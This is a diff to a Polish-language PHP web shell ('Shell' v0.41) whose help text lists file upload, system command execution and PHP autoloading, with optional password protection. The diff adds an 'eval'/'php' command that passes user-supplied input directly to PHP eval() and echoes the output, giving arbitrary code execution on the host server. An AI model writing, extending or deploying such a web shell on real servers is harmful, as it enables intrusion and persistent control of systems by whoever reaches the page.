@@ -19,7 +19,7 @@ require_once dirname( __FILE__ ) . '/Lib/XRecursiveDirectoryIterator.php';
  * class Shell - Zarzadzanie serwerem
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @version 0.41
  *
@@ -37,7 +37,7 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\nversion - Wyświetlanie numeru wersji shell'a\r\nlogout - Wylogowanie";
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego kataloguversion - Wyświetlanie numeru wersji shella\r\nlogout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -1015,6 +1015,36 @@ DATA;
 	}
 
 	/**
+	 * Komenda - eval
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandEval()
+	{
+		if( $this -> bHelp  || ( $this -> iArgc === 0 ) )
+		{
+			return <<<DATA
+Wykonanie kodu PHP
+
+	Użycie
+		eval skrypt_php
+
+	Przykład
+		eval echo md5( 'test' );
+DATA;
+		}
+
+		ob_start();
+		eval( $this -> sArgv );
+		$sData = ob_get_contents();
+		ob_clean();
+		ob_end_flush();
+
+		return htmlspecialchars( $sData );
+	}
+
+	/**
 	 * Komenda - cd
 	 *
 	 * @access private
@@ -1242,7 +1272,7 @@ DATA;
 		if( $this -> bHelp )
 		{
 			return <<<DATA
-logout - Wylogowanie
+logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)
 
 	Użycie:
 		logout
@@ -1505,6 +1535,10 @@ DATA;
 				case 'autoload':
 					$sConsole = $this -> getCommandAutoload();
 					break ;
+				case 'eval':
+				case 'php':
+					$sConsole = $this -> getCommandEval();
+					break ;
 				case 'version':
 					$sConsole = $this -> getCommandVersion();
 					break ;
@@ -1578,7 +1612,7 @@ DATA;
 					}
 					else
 					{
-						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', htmlspecialchars( $this -> sCmd ) );
+						$sConsole = sprintf( 'Nie ma takiego polecenia "%s"', htmlspecialchars( $this -> sCmd ) );
 					}
 			}
 		}
